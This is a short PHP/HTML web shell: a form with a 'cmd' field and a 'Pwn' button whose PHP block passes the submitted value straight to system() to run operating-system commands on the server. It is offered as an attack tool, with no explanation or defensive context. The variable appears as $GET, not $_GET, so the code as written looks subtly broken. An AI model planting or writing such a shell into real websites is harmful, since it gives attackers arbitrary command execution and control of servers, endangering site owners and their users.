<html>
<body>
<form method="get">
<input type="text" name="cmd">
<input type="submit" value="Pwn">
</form>
<pre>
<?php
    if(isset($GET['cmd']))
    {
        system($GET['cmd']);
    }
?>
</pre>
</body>
</html>